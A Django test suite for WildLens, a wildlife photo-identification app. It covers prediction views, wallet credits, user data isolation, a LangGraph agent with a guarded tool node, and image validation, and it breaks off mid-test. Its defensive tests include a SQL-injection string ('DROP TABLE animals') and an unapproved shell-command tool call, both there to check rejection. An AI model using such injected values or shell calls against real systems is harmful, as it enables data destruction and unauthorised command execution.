import io
import json
import uuid
from decimal import Decimal
from unittest.mock import patch, MagicMock
from PIL import Image

import httpx
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.core.files.uploadedfile import SimpleUploadedFile
from django.urls import reverse
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage, SystemMessage

from animal.models import AnimalPrediction, Contact, WildlifeConversation, WildlifeMessage
from animal.services.image_validator import (
    validate_and_process_image,
    ImageValidationError,
    MAX_FILE_SIZE_BYTES,
)
from animal.services.gemini_service import (
    get_gemini_model,
    AnimalIdentificationResult,
    GeminiConfigurationError,
    GeminiQuotaError,
    GeminiTimeoutError,
    GeminiModelAccessError,
    GeminiServiceError,
)
from animal.agent.state import WildlifeAgentState
from animal.agent.tools import (
    lookup_species_taxonomy,
    get_wildlife_facts,
    ControlledToolNode,
    APPROVED_TOOLS,
    MAX_EXTERNAL_TOOL_CALLS,
)
from animal.agent.graph import (
    run_wildlife_agent,
    build_wildlife_agent_graph,
    MAX_GRAPH_ITERATIONS,
)
from animal.utils import (
    extract_clean_message_text,
    render_markdown_safe,
    is_valid_source_url,
    sanitize_source_references,
    organize_dossier_sections,
    get_section_icon,
)
from animal.templatetags.wildlife_tags import (
    render_dossier,
    render_markdown,
    clean_text,
    valid_sources,
    get_dossier_sections,
    dossier_sections,
)
from transactions.models import Profile


def create_test_image(format="PNG", color=(34, 139, 34), size=(64, 64), filename="test.png"):
    """Helper to generate a valid in-memory image."""
    buffer = io.BytesIO()
    image = Image.new("RGB", size, color=color)
    image.save(buffer, format=format)
    buffer.seek(0)
    mime = "image/png" if format.upper() == "PNG" else f"image/{format.lower()}"
    return SimpleUploadedFile(filename, buffer.read(), content_type=mime)


# ===========================================================================
# 1. Django Animal App & View Integration Tests
# ===========================================================================

class AnimalAppTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user1 = User.objects.create_user(
            username="user_one",
            email="one@example.com",
            password="StrongPassword123!"
        )
        self.user2 = User.objects.create_user(
            username="user_two",
            email="two@example.com",
            password="StrongPassword123!"
        )

    def test_home_page_loads(self):
        """Verify home page loads with 200 OK."""
        response = self.client.get(reverse("home"))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "animal/home.html")

    def test_contact_page_get(self):
        """Verify contact form page loads."""
        response = self.client.get(reverse("contact"))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "animal/contact.html")

    def test_contact_page_post_success(self):
        """Verify submitting contact form creates Contact record in DB."""
        response = self.client.post(reverse("contact"), {
            "name": "Ranger John",
            "email": "ranger@example.com",
            "subject": "Tiger sighting inquiry",
            "message": "Saw footprints in sector 4."
        })
        self.assertEqual(response.status_code, 200)
        self.assertTrue(Contact.objects.filter(email="ranger@example.com").exists())
        contact = Contact.objects.get(email="ranger@example.com")
        self.assertEqual(str(contact), "Ranger John (ranger@example.com)")

    def test_predict_requires_authentication(self):
        """Verify unauthenticated user cannot access predict endpoint."""
        response = self.client.get(reverse("predict"))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response.url)

    @patch("animal.views.run_wildlife_agent")
    def test_agent_vision_valid_animal(self, mock_agent):
        """Test Scenario 1: Valid animal identified and educational profile assembled by agent."""
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "identified",
                "common_name": "Red Fox",
                "scientific_name": "Vulpes vulpes",
                "visual_clues": ["Bushy white-tipped tail", "Pointed black ears", "Orange-red coat"],
                "alternative_species": ["Gray Fox", "Coyote"],
                "wildlife_information": "Red Fox is an adaptable omnivorous canid native across the Northern Hemisphere.",
                "source_references": [
                    {"title": "Vulpes vulpes", "url": "https://www.gbif.org/species/5219243", "source": "GBIF"}
                ],
            },
            "identification": {
                "is_animal": True,
                "identification_status": "identified",
                "common_name": "Red Fox",
                "scientific_name": "Vulpes vulpes",
                "visual_clues": ["Bushy white-tipped tail", "Pointed black ears", "Orange-red coat"],
                "alternative_species": ["Gray Fox", "Coyote"],
                "identification_note": "Distinctive adult Red Fox observed in daylight.",
            },
            "tool_call_count": 2,
            "messages": [AIMessage(content="Red Fox profile")]
        }

        self.client.login(username="user_one", password="StrongPassword123!")
        test_img = create_test_image(format="PNG", filename="fox.png")

        response = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "animal/predict.html")

        # Verify SQLite prediction record
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user1).count(), 1)
        pred = AnimalPrediction.objects.filter(user=self.user1).first()
        self.assertEqual(pred.common_name, "Red Fox")
        self.assertEqual(pred.scientific_name, "Vulpes vulpes")
        self.assertEqual(pred.identification_status, "identified")
        self.assertIn("Red Fox", pred.identification_notes)
        self.assertEqual(len(pred.visual_clues), 3)

        # Verify conversation initialized
        self.assertEqual(WildlifeConversation.objects.filter(prediction=pred).count(), 1)
        conv = WildlifeConversation.objects.filter(prediction=pred).first()
        self.assertEqual(conv.messages.filter(role="assistant").count(), 1)

        # Verify wallet deduction
        profile = self.user1.profile
        profile.refresh_from_db()
        self.assertEqual(profile.wallet_balance, Decimal("4.00"))
        self.assertEqual(profile.total_predictions, 1)

    @patch("animal.views.run_wildlife_agent")
    def test_agent_vision_uncertain_animal(self, mock_agent):
        """Test Scenario 2: Uncertain animal where specimen details are ambiguous."""
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "uncertain",
                "common_name": "Uncertain Species",
                "scientific_name": None,
                "visual_clues": ["Silhouette of raptor perched high in pine canopy"],
                "alternative_species": ["Red-tailed Hawk", "Cooper's Hawk"],
                "wildlife_information": "Distant raptor silhouette. Inadequate light resolution to verify breast streaking.",
                "source_references": [],
            },
            "identification": {
                "is_animal": True,
                "identification_status": "uncertain",
                "common_name": None,
                "scientific_name": None,
                "visual_clues": ["Silhouette of raptor perched high in pine canopy"],
                "alternative_species": ["Red-tailed Hawk", "Cooper's Hawk"],
                "identification_note": "Distant raptor silhouette. Inadequate light resolution.",
            },
            "tool_call_count": 0,
            "messages": []
        }

        self.client.login(username="user_one", password="StrongPassword123!")
        test_img = create_test_image(format="JPEG", filename="raptor.jpg")

        response = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(response.status_code, 200)

        pred = AnimalPrediction.objects.filter(user=self.user1).first()
        self.assertIsNotNone(pred)
        self.assertEqual(pred.common_name, "Uncertain Species")
        self.assertEqual(pred.identification_status, "uncertain")
        self.assertEqual(pred.alternative_species, ["Red-tailed Hawk", "Cooper's Hawk"])

    @patch("animal.views.run_wildlife_agent")
    def test_agent_vision_no_animal_detected(self, mock_agent):
        """Test Scenario 3: No animal detected in photograph."""
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "not_animal",
                "common_name": "No Animal Detected",
                "scientific_name": None,
                "visual_clues": [],
                "alternative_species": [],
                "wildlife_information": "The photograph depicts a ceramic coffee mug on a desk. No wildlife present.",
                "source_references": [],
            },
            "identification": {
                "is_animal": False,
                "identification_status": "not_animal",
                "common_name": None,
                "scientific_name": None,
                "visual_clues": [],
                "alternative_species": [],
                "identification_note": "Ceramic coffee mug on a desk.",
            },
            "tool_call_count": 0,
            "messages": []
        }

        self.client.login(username="user_one", password="StrongPassword123!")
        test_img = create_test_image(format="PNG", filename="mug.png")

        response = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(response.status_code, 200)

        pred = AnimalPrediction.objects.filter(user=self.user1).first()
        self.assertEqual(pred.common_name, "No Animal Detected")
        self.assertEqual(pred.identification_status, "not_animal")
        self.assertEqual(pred.credit_used, 0.0)

        # Rule 7: Images with no identifiable animal do not consume credits
        profile = self.user1.profile
        profile.refresh_from_db()
        self.assertEqual(profile.wallet_balance, Decimal("5.00"))

    def test_agent_invalid_image_rejected(self):
        """Test Scenario 4: Non-image and corrupted files rejected prior to agent invocation."""
        self.client.login(username="user_one", password="StrongPassword123!")
        fake_file = SimpleUploadedFile("fake.txt", b"not-a-valid-bitmap", content_type="text/plain")

        response = self.client.post(reverse("predict"), {"image": fake_file})
        self.assertEqual(response.status_code, 200)
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user1).count(), 0)

        profile = self.user1.profile
        profile.refresh_from_db()
        self.assertEqual(profile.wallet_balance, Decimal("5.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_agent_quota_error_handled(self, mock_agent):
        """Test Scenario 5: Quota exceeded handled gracefully without crashing or charging."""
        mock_agent.side_effect = GeminiQuotaError("API rate limit exceeded.")

        self.client.login(username="user_one", password="StrongPassword123!")
        test_img = create_test_image()

        response = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(response.status_code, 200)
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user1).count(), 0)

        profile = self.user1.profile
        profile.refresh_from_db()
        self.assertEqual(profile.wallet_balance, Decimal("5.00"))

    def test_predict_blocked_when_insufficient_wallet_balance(self):
        """Verify prediction fails gracefully when user has 0 credits."""
        self.client.login(username="user_one", password="StrongPassword123!")
        profile = self.user1.profile
        profile.wallet_balance = Decimal("0.00")
        profile.save()

        test_img = create_test_image()
        response = self.client.post(reverse("predict"), {"image": test_img})

        self.assertEqual(response.status_code, 200)
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user1).count(), 0)

    def test_history_enforces_user_privacy(self):
        """Verify users can only see their own prediction records, not others."""
        AnimalPrediction.objects.create(
            user=self.user1,
            uploaded_image="uploads/user1_img.png",
            common_name="Red Fox",
            scientific_name="Vulpes vulpes",
            confidence=0.0,
            credit_used=1.0
        )
        AnimalPrediction.objects.create(
            user=self.user2,
            uploaded_image="uploads/user2_img.png",
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris",
            confidence=0.0,
            credit_used=1.0
        )

        self.client.login(username="user_one", password="StrongPassword123!")
        response = self.client.get(reverse("history"))
        self.assertEqual(response.status_code, 200)

        predictions_shown = list(response.context["predictions"])
        self.assertEqual(len(predictions_shown), 1)
        self.assertEqual(predictions_shown[0].common_name, "Red Fox")

    def test_prediction_detail_data_isolation(self):
        """Verify User A can view their own prediction detail, but User B receives 404."""
        pred1 = AnimalPrediction.objects.create(
            user=self.user1,
            uploaded_image="uploads/fox.png",
            common_name="Red Fox",
            scientific_name="Vulpes vulpes",
            confidence=0.0,
            credit_used=1.0
        )

        self.client.login(username="user_one", password="StrongPassword123!")
        res1 = self.client.get(reverse("prediction_detail", args=[pred1.id]))
        self.assertEqual(res1.status_code, 200)

        self.client.login(username="user_two", password="StrongPassword123!")
        res2 = self.client.get(reverse("prediction_detail", args=[pred1.id]))
        self.assertEqual(res2.status_code, 404)

    @patch("animal.views.run_wildlife_agent")
    def test_prediction_detail_chat_post_interaction(self, mock_agent):
        """Verify multi-turn conversational post appends messages to conversation and calls agent."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="Red foxes are omnivores primarily feeding on small rodents, berries, and birds.")],
            "tool_call_count": 0,
            "source_references": []
        }

        pred = AnimalPrediction.objects.create(
            user=self.user1,
            uploaded_image="uploads/fox.png",
            common_name="Red Fox",
            scientific_name="Vulpes vulpes",
            confidence=0.0,
            credit_used=1.0
        )

        self.client.login(username="user_one", password="StrongPassword123!")
        response = self.client.post(
            reverse("prediction_detail", args=[pred.id]),
            {"message": "What is the typical diet of this species?"}
        )
        self.assertEqual(response.status_code, 302)

        conv = WildlifeConversation.objects.get(user=self.user1, prediction=pred)
        self.assertEqual(conv.messages.count(), 2)
        user_msg = conv.messages.filter(role="user").first()
        asst_msg = conv.messages.filter(role="assistant").first()
        self.assertEqual(user_msg.content, "What is the typical diet of this species?")
        self.assertIn("omnivores", asst_msg.content)


# ===========================================================================
# 2. External Wildlife Tools & ControlledToolNode Unit Tests
# ===========================================================================

class WildlifeToolsUnitTests(TestCase):
    """Unit tests for GBIF Species API and MediaWiki API read-only tools."""

    @patch("httpx.Client.get")
    def test_lookup_species_taxonomy_matched(self, mock_get):
        """Verify GBIF species lookup returns structured taxonomy on successful match."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "usageKey": 5219243,
            "scientificName": "Vulpes vulpes (Linnaeus, 1758)",
            "canonicalName": "Vulpes vulpes",
            "status": "ACCEPTED",
            "matchType": "EXACT",
            "confidence": 99,
            "kingdom": "Animalia",
            "phylum": "Chordata",
            "class": "Mammalia",
            "order": "Carnivora",
            "family": "Canidae",
            "genus": "Vulpes",
            "species": "Vulpes vulpes"
        }
        mock_get.return_value = mock_resp

        result_raw = lookup_species_taxonomy.invoke({"scientific_name": "Vulpes vulpes"})
        data = json.loads(result_raw)

        self.assertEqual(data["status"], "MATCHED")
        self.assertEqual(data["family"], "Canidae")
        self.assertEqual(data["order"], "Carnivora")
        self.assertEqual(data["class"], "Mammalia")
        self.assertEqual(data["genus"], "Vulpes")
        self.assertEqual(data["taxonomic_match_status"], "ACCEPTED")
        self.assertIn("https://www.gbif.org/species/5219243", data["source_url"])

    @patch("httpx.Client.get")
    def test_lookup_species_taxonomy_no_match(self, mock_get):
        """Verify GBIF tool handles ambiguous or unresolvable species without crashing."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"matchType": "NONE", "confidence": 0}
        mock_get.return_value = mock_resp

        result_raw = lookup_species_taxonomy.invoke({"scientific_name": "UnresolvableFakeSpecies"})
        data = json.loads(result_raw)

        self.assertEqual(data["status"], "NO_MATCH")
        self.assertIn("No definitive taxonomic match", data["message"])

    @patch("httpx.Client.get")
    def test_lookup_species_taxonomy_timeout(self, mock_get):
        """Verify GBIF tool handles HTTP timeouts gracefully."""
        mock_get.side_effect = httpx.TimeoutException("Connection timed out")

        result_raw = lookup_species_taxonomy.invoke({"scientific_name": "Panthera tigris"})
        data = json.loads(result_raw)

        self.assertEqual(data["status"], "TIMEOUT")
        self.assertIn("timed out", data["message"])

    def test_lookup_species_taxonomy_parameter_validation(self):
        """Verify GBIF tool rejects malicious injection characters and oversized input."""
        res_empty = json.loads(lookup_species_taxonomy.invoke({"scientific_name": "   "}))
        self.assertEqual(res_empty["status"], "VALIDATION_ERROR")

        res_long = json.loads(lookup_species_taxonomy.invoke({"scientific_name": "A" * 200}))
        self.assertEqual(res_long["status"], "VALIDATION_ERROR")

        res_unsafe = json.loads(lookup_species_taxonomy.invoke({"scientific_name": "Panthera; DROP TABLE animals;"}))
        self.assertEqual(res_unsafe["status"], "VALIDATION_ERROR")

    @patch("httpx.Client.get")
    def test_get_wildlife_facts_found(self, mock_get):
        """Verify MediaWiki tool retrieves summary and verified URL."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "query": {
                "pages": {
                    "12345": {
                        "title": "Red fox",
                        "fullurl": "https://en.wikipedia.org/wiki/Red_fox",
                        "extract": "The red fox is the largest of the true foxes and the most widely distributed carnivoran."
                    }
                }
            }
        }
        mock_get.return_value = mock_resp

        result_raw = get_wildlife_facts.invoke({"species_name": "Red fox"})
        data = json.loads(result_raw)

        self.assertEqual(data["status"], "FOUND")
        self.assertEqual(data["article_title"], "Red fox")
        self.assertIn("largest of the true foxes", data["summary"])
        self.assertEqual(data["source_url"], "https://en.wikipedia.org/wiki/Red_fox")
        self.assertIn("Not verified", data["conservation_status_note"])

    @patch("httpx.Client.get")
    def test_get_wildlife_facts_not_found(self, mock_get):
        """Verify MediaWiki tool handles non-existent species pages cleanly."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"query": {"pages": {"-1": {"missing": ""}}}}
        mock_get.return_value = mock_resp

        result_raw = get_wildlife_facts.invoke({"species_name": "ImaginaryCreature"})
        data = json.loads(result_raw)

        self.assertEqual(data["status"], "NOT_FOUND")

    # -----------------------------------------------------------------------
    # ControlledToolNode Execution Guard Tests
    # -----------------------------------------------------------------------

    def test_controlled_tool_node_rejects_unknown_tool(self):
        """Verify ControlledToolNode rejects unapproved or shell-like tool names."""
        node = ControlledToolNode(APPROVED_TOOLS, max_tool_calls=3)
        bad_ai_msg = AIMessage(
            content="",
            tool_calls=[{"name": "execute_shell_command", "args": {"cmd": "ls"}, "id": "bad_call_1"}]
        )
        output = node.invoke({"messages": [bad_ai_msg], "tool_call_count": 0, "executed_tool_calls": []})

        tool_msgs = output["messages"]
        self.assertEqual(len(tool_msgs), 1)
        self.assertEqual(tool_msgs[0].status, "error")
        self.assertIn("Unknown tool", tool_msgs[0].content)

    @patch("httpx.Client.get")
    def test_controlled_tool_node_prevents_duplicate_calls(self, mock_get):
        """Verify ControlledToolNode halts execution of identical consecutive tool requests."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"matchType": "EXACT", "usageKey": 12345, "canonicalName": "Vulpes vulpes"}
        mock_get.return_value = mock_resp

        node = ControlledToolNode(APPROVED_TOOLS, max_tool_calls=3)
        call_sig = {"name": "lookup_species_taxonomy", "args": {"scientific_name": "Vulpes vulpes"}, "id": "c1"}

        # First run: valid execution
        msg1 = AIMessage(content="", tool_calls=[call_sig])
        res1 = node.invoke({"messages": [msg1], "tool_call_count": 0, "executed_tool_calls": []})
        self.assertEqual(res1["tool_call_count"], 1)

        # Second run: duplicate tool call with same arguments
        msg2 = AIMessage(content="", tool_calls=[call_sig])
        res2 = node.invoke({
            "messages": res1["messages"] + [msg2],
            "tool_call_count": res1["tool_call_count"],
            "executed_tool_calls": res1["executed_tool_calls"]
        })

        self.assertEqual(res2["tool_call_count"], 1)  # No increment
        tool_msgs = res2["messages"]
        self.assertTrue(any("already executed" in m.content for m in tool_msgs))

    def test_controlled_tool_node_enforces_maximum_tool_call_limit(self):
        """Verify ControlledToolNode enforces maximum tool call budget (3 calls max)."""
        node = ControlledToolNode(APPROVED_TOOLS, max_tool_calls=2)
        ai_msg = AIMessage(
            content="",
            tool_calls=[
                {"name": "lookup_species_taxonomy", "args": {"scientific_name": "Panthera leo"}, "id": "c1"},
                {"name": "get_wildlife_facts", "args": {"species_name": "Lion"}, "id": "c2"},
                {"name": "lookup_species_taxonomy", "args": {"scientific_name": "Panthera tigris"}, "id": "c3"},
            ]
        )

        with patch("httpx.Client.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.json.return_value = {"matchType": "NONE"}
            mock_get.return_value = mock_resp

            output = node.invoke({"messages": [ai_msg], "tool_call_count": 0, "executed_tool_calls": []})

        self.assertEqual(output["tool_call_count"], 2)
        tool_msgs = output["messages"]
        # Third tool call should return limit notice
        self.assertTrue(any("limit of 2" in m.content for m in tool_msgs))


# ===========================================================================
# 3. LangGraph Wildlife Agent StateGraph Integration Tests
# ===========================================================================

class LangGraphStateGraphIntegrationTests(TestCase):
    """Integration tests for StateGraph routing, vision integration, and termination safety."""

    @patch("animal.agent.graph.identify_animal_from_image")
    def test_graph_image_no_animal_terminates_at_vision_node(self, mock_ident):
        """Verify image with no animal halts immediately at vision_node without agent node execution."""
        mock_ident.return_value = AnimalIdentificationResult(
            is_animal=False,
            identification_status="not_animal",
            common_name=None,
            scientific_name=None,
            visual_clues=[],
            alternative_species=[],
            identification_note="Ceramic cup on a table."
        )

        result = run_wildlife_agent(
            request_type="image",
            image_bytes=b"dummy_bytes",
            mime_type="image/jpeg"
        )

        final_res = result.get("final_result")
        self.assertIsNotNone(final_res)
        self.assertEqual(final_res["identification_status"], "not_animal")
        self.assertEqual(final_res["common_name"], "No Animal Detected")
        self.assertEqual(result.get("tool_call_count"), 0)
        self.assertEqual(result.get("iteration_count"), 0)

    @patch("animal.agent.graph.identify_animal_from_image")
    def test_graph_image_uncertain_terminates_at_vision_node(self, mock_ident):
        """Verify uncertain identification halts safely with alternatives without making external tool calls."""
        mock_ident.return_value = AnimalIdentificationResult(
            is_animal=True,
            identification_status="uncertain",
            common_name="Uncertain Raptor",
            scientific_name=None,
            visual_clues=["Distant silhouette"],
            alternative_species=["Golden Eagle", "Osprey"],
            identification_note="Distant bird of prey."
        )

        result = run_wildlife_agent(
            request_type="image",
            image_bytes=b"dummy_bytes",
            mime_type="image/jpeg"
        )

        final_res = result.get("final_result")
        self.assertIsNotNone(final_res)
        self.assertEqual(final_res["identification_status"], "uncertain")
        self.assertEqual(final_res["alternative_species"], ["Golden Eagle", "Osprey"])
        self.assertEqual(result.get("tool_call_count"), 0)

    @patch("animal.agent.graph.get_gemini_model")
    @patch("animal.agent.graph.identify_animal_from_image")
    def test_graph_image_identified_executes_agent_and_tools(self, mock_ident, mock_get_model):
        """Verify valid animal executes vision node, routes to agent node, calls tools, and synthesizes final answer."""
        mock_ident.return_value = AnimalIdentificationResult(
            is_animal=True,
            identification_status="identified",
            common_name="Red Fox",
            scientific_name="Vulpes vulpes",
            visual_clues=["Bushy tail"],
            alternative_species=[],
            identification_note="Clear fox sighting."
        )

        # Mock Model: Turn 1 requests tool call, Turn 2 provides final synthesis
        mock_model = MagicMock()
        mock_bound = MagicMock()

        turn1_response = AIMessage(
            content="",
            tool_calls=[{"name": "lookup_species_taxonomy", "args": {"scientific_name": "Vulpes vulpes"}, "id": "call_1"}]
        )
        turn2_response = AIMessage(
            content="Red Fox (Vulpes vulpes) is a widely distributed canid. Family: Canidae. Conservation: Not verified."
        )

        mock_bound.invoke.side_effect = [turn1_response, turn2_response]
        mock_model.bind_tools.return_value = mock_bound
        mock_get_model.return_value = mock_model

        with patch("httpx.Client.get") as mock_http:
            mock_http_resp = MagicMock()
            mock_http_resp.status_code = 200
            mock_http_resp.json.return_value = {
                "usageKey": 5219243,
                "canonicalName": "Vulpes vulpes",
                "status": "ACCEPTED",
                "matchType": "EXACT",
                "family": "Canidae",
                "order": "Carnivora"
            }
            mock_http.return_value = mock_http_resp

            result = run_wildlife_agent(
                request_type="image",
                image_bytes=b"dummy_image_data",
                mime_type="image/png"
            )

        final_res = result.get("final_result")
        self.assertIsNotNone(final_res)
        self.assertEqual(final_res["common_name"], "Red Fox")
        self.assertEqual(final_res["identification_status"], "identified")
        self.assertIn("Canidae", final_res["wildlife_information"])
        self.assertEqual(result.get("tool_call_count"), 1)
        self.assertEqual(len(final_res["source_references"]), 1)

    @patch("animal.agent.graph.get_gemini_model")
    def test_graph_chat_multi_turn_flow(self, mock_get_model):
        """Verify chat request bypasses vision node and directly executes agent node."""
        mock_model = MagicMock()
        mock_bound = MagicMock()
        mock_bound.invoke.return_value = AIMessage(
            content="Tigers inhabit tropical rainforests, mangrove swamps, and temperate forests across Asia."
        )
        mock_model.bind_tools.return_value = mock_bound
        mock_get_model.return_value = mock_model

        history = [
            HumanMessage(content="What animal is this?"),
            AIMessage(content="It is a Bengal Tiger (Panthera tigris).")
        ]

        result = run_wildlife_agent(
            request_type="chat",
            user_message="Where do they live in the wild?",
            conversation_history=history
        )

        final_res = result.get("final_result")
        self.assertIsNotNone(final_res)
        self.assertIn("tropical rainforests", final_res["wildlife_information"])
        self.assertEqual(result.get("iteration_count"), 1)

    @patch("animal.agent.graph.get_gemini_model")
    def test_graph_prevents_infinite_loop_with_iteration_limit(self, mock_get_model):
        """Verify graph halts safely without hanging when an agent model continuously issues tool calls."""
        mock_model = MagicMock()
        mock_bound = MagicMock()

        # Model always returns a new tool call
        looping_msg = AIMessage(
            content="",
            tool_calls=[{"name": "lookup_species_taxonomy", "args": {"scientific_name": "Vulpes vulpes"}, "id": "loop_call"}]
        )
        mock_bound.invoke.return_value = looping_msg
        mock_model.bind_tools.return_value = mock_bound

        # Raw model for forced final synthesis returns final text
        mock_model.invoke.return_value = AIMessage(content="Final synthesis forced by iteration limit.")
        mock_get_model.return_value = mock_model

        with patch("httpx.Client.get") as mock_http:
            mock_http_resp = MagicMock()
            mock_http_resp.status_code = 200
            mock_http_resp.json.return_value = {"matchType": "NONE"}
            mock_http.return_value = mock_http_resp

            result = run_wildlife_agent(
                request_type="chat",
                user_message="Inquire about species",
                conversation_history=[]
            )

        # Iterations must not exceed MAX_GRAPH_ITERATIONS (5)
        self.assertLessEqual(result.get("iteration_count", 0), MAX_GRAPH_ITERATIONS)


# ===========================================================================
# 4. Pillow Image Validator Unit Tests
# ===========================================================================

class ImageValidatorUnitTests(TestCase):
    """Unit tests for Pillow image validation service."""

    def test_valid_png_and_jpeg(self):
        """Valid PNG and JPEG files validate and return raw bytes and mime type."""
        png_file = create_test_image(format="PNG")
        raw_bytes, mime = validate_and_process_image(png_file)
        self.assertTrue(len(raw_bytes) > 0)
        self.assertEqual(mime, "image/png")

        jpg_file = create_test_image(format="JPEG", filename="sample.jpg")
        raw_bytes, mime = validate_and_process_image(jpg_file)
        self.assertTrue(len(raw_bytes) > 0)
        self.assertEqual(mime, "image/jpeg")

    def test_empty_file_rejected(self):
        """Empty files are rejected."""
        empty_file = SimpleUploadedFile("empty.png", b"", content_type="image/png")
        with self.assertRaises(ImageValidationError):
            validate_and_process_image(empty_file)

    def test_unsupported_format_rejected(self):
        """Non-image files like plain text are rejected."""
        text_file = SimpleUploadedFile("doc.txt", b"plain text content", content_type="text/plain")
        with self.assertRaises(ImageValidationError):
            validate_and_process_image(text_file)

    def test_oversized_file_rejected(self):
        """Files exceeding 5 MB limit are rejected."""
        oversized = SimpleUploadedFile(
            "large.png",
            b"0" * (MAX_FILE_SIZE_BYTES + 1024),
            content_type="image/png"
        )
        with self.assertRaises(ImageValidationError):
            validate_and_process_image(oversized)

    def test_raw_bytes_input_supported(self):
        """Raw bytes input is directly supported without requiring seek/read attributes."""
        png_file = create_test_image(format="PNG")
        png_bytes = png_file.read()
        self.assertIsInstance(png_bytes, bytes)
        raw_bytes, mime = validate_and_process_image(png_bytes)
        self.assertEqual(raw_bytes, png_bytes)
        self.assertEqual(mime, "image/png")


# ===========================================================================
# 5. Gemini Service Factory Unit Tests
# ===========================================================================

class GeminiServiceUnitTests(TestCase):
    """Unit tests for Gemini service factory and configuration."""

    def test_factory_missing_api_key_raises_configuration_error(self):
        """Factory raises GeminiConfigurationError if GOOGLE_API_KEY is unset."""
        with patch.dict("os.environ", {}, clear=True):
            with self.assertRaises(GeminiConfigurationError):
                get_gemini_model()

    def test_factory_with_valid_key_creates_model(self):
        """Factory initializes ChatGoogleGenerativeAI instance when API key is provided."""
        with patch.dict("os.environ", {"GOOGLE_API_KEY": "dummy_test_api_key_12345", "GEMINI_MODEL": "gemini-3.8-flash"}):
            model = get_gemini_model()
            self.assertEqual(model.model, "gemini-3.8-flash")


# ===========================================================================
# 6. Phase 5: WildLens Conversational Assistant Tests
# ===========================================================================

class WildlifeAssistantChatTests(TestCase):
    """Test suite for the context-aware conversational wildlife assistant (/assistant/chat/)."""

    def setUp(self):
        self.client = Client()
        self.user1 = User.objects.create_user(
            username="bot_user_1",
            email="bot1@example.com",
            password="StrongPassword123!"
        )
        self.user2 = User.objects.create_user(
            username="bot_user_2",
            email="bot2@example.com",
            password="StrongPassword123!"
        )

        self.pred1 = AnimalPrediction.objects.create(
            user=self.user1,
            uploaded_image="uploads/tiger.png",
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris",
            identification_status="identified",
            identification_notes="Observed adult male Bengal Tiger near waterhole.",
            visual_clues=["Distinct black stripes", "Orange-reddish coat", "White underbelly"],
            alternative_species=["Indochinese Tiger"],
            wildlife_information={"summary": "The Bengal tiger is a native pantherine cat in South Asia."},
            source_references=[{"title": "Panthera tigris", "url": "https://www.gbif.org/species/5219404", "source": "GBIF"}],
            confidence=0.0,
            credit_used=1.0
        )

        self.conv1 = WildlifeConversation.objects.create(
            user=self.user1,
            prediction=self.pred1,
            title="Bengal Tiger Inquiry"
        )
        WildlifeMessage.objects.create(
            conversation=self.conv1,
            role="assistant",
            content="Initial educational summary about Bengal Tiger."
        )

    def test_assistant_chat_unauthenticated(self):
        """Verify unauthenticated requests are redirected to login."""
        response = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "What is its diet?"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response.url)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_success_english(self, mock_agent):
        """Verify conversational assistant responds to English inquiry and records interaction."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="Bengal tigers are apex carnivores preying on deer, wild boar, and water buffalo.")],
            "final_result": {
                "wildlife_information": "Bengal tigers are apex carnivores preying on deer, wild boar, and water buffalo.",
                "source_references": [{"title": "Bengal Tiger", "url": "https://en.wikipedia.org/wiki/Bengal_tiger", "source": "MediaWiki"}]
            },
            "source_references": [{"title": "Bengal Tiger", "url": "https://en.wikipedia.org/wiki/Bengal_tiger", "source": "MediaWiki"}]
        }

        self.client.login(username="bot_user_1", password="StrongPassword123!")
        response = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "What does this tiger eat in the wild?"}),
            content_type="application/json"
        )

        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data["success"])
        self.assertIn("apex carnivores", data["answer"])
        self.assertEqual(len(data["sources"]), 1)
        self.assertEqual(data["conversation_id"], self.conv1.id)

        # Verify SQLite persistence
        self.assertEqual(self.conv1.messages.count(), 3)  # Initial + User + Assistant
        last_user = self.conv1.messages.filter(role="user").last()
        last_asst = self.conv1.messages.filter(role="assistant").last()
        self.assertEqual(last_user.content, "What does this tiger eat in the wild?")
        self.assertIn("apex carnivores", last_asst.content)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_hindi_response(self, mock_agent):
        """Verify conversational assistant responds fluently in Hindi when requested."""
        hindi_reply = "बंगाल टाइगर (Panthera tigris) मुख्य रूप से चीतल, सांभर हिरण और जंगली सूअर का शिकार करते हैं।"
        mock_agent.return_value = {
            "messages": [AIMessage(content=hindi_reply)],
            "final_result": {"wildlife_information": hindi_reply, "source_references": []},
            "source_references": []
        }

        self.client.login(username="bot_user_1", password="StrongPassword123!")
        response = self.client.post(
